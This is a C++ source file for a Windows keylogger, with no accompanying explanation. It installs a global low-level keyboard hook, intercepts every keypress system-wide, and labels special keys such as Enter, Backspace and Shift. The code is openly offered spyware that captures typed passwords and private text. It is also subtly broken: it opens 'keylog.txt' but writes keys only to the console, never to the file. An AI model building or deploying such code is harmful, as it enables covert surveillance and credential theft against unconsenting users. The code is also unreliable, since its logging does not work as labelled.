#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

// Function to log keys pressed to file
void keylogger(int key) {
    ofstream logfile;
    logfile.open("keylog.txt", ios::app);
    
    // Handle special keys
    if (key == VK_BACK) {
        cout << "[BACKSPACE]";
    }   
    else if (key == VK_RETURN) {    
        cout << "[ENTER]";    
    }
    else if (key == VK_SPACE) {
        cout << "[SPACE]";
    }
    else if (key == VK_TAB) {
        cout << "[TAB]";    
    }
    else if (key == VK_SHIFT) {
        cout << "[SHIFT]";    
    }
    else if (key == VK_CAPITAL) {
        cout << "[CAPSLOCK]";
    }
    else if (key == VK_ESCAPE) {
        cout << "[ESC]";                             
    }   
    else if (key == VK_LWIN || key == VK_RWIN) {
        cout << "[WIN]";
    }
    else {
        // Log all other keys as characters
        cout << (char)key;
    }
    logfile.close();
}

LRESULT CALLBACK KeyboardProcess(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyboard->vkCode;
        keylogger(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    HHOOK KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProcess, NULL, 0);

    MSG msg; 
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(KeyboardHook);
    return 0;
}
